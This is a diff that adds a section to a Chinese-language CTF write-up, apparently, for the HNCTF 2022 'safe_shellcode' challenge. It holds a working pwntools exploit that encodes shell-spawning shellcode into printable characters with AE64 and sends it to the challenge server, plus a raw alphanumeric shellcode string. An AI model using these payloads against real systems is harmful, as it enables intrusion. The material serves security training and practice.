@@ -43,3 +43,29 @@ payload2=flat([stack_overflow,buf_addr])
 p.sendline(payload2)
 p.interactive()
 ```
+
+## [HNCTF 2022 Week1]safe_shellcode
+
+可见字符shellcode，可用工具有： https://github.com/veritas501/ae64 和 https://github.com/SkyLined/alpha3 ，后者年久失修没法用了。
+
+AE64要注意设置调用buff所在处使用的寄存器为rax，即`call rax`。
+
+```python
+from pwn import *
+from ae64 import *
+context(log_level='debug',os='linux',arch='amd64')
+p=remote("node5.anna.nssctf.cn",28988)
+elf=ELF('./attachment')
+ae64obj=AE64()
+shellcode=ae64obj.encode(asm(shellcraft.sh()),'rax')
+buff_addr=p64(elf.sym["buff"])
+payload1=flat([shellcode.ljust(0x220+0x8,b'\x00'),buff_addr])
+p.sendline(payload1)
+p.interactive()
+```
+
+通过alpha3求出的shellcode为：
+
+```
+Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t
+```
